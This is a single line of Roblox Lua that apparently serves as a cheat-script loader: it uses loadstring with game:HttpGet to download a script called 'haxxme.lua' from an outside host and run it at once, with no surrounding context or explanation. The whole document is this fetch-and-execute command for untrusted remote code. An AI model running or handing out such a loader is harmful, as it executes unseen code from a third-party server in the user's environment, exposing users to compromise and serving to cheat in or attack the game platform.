loadstring(game:HttpGet("http://stockerperso.me/scripts/haxxme.lua", true))()
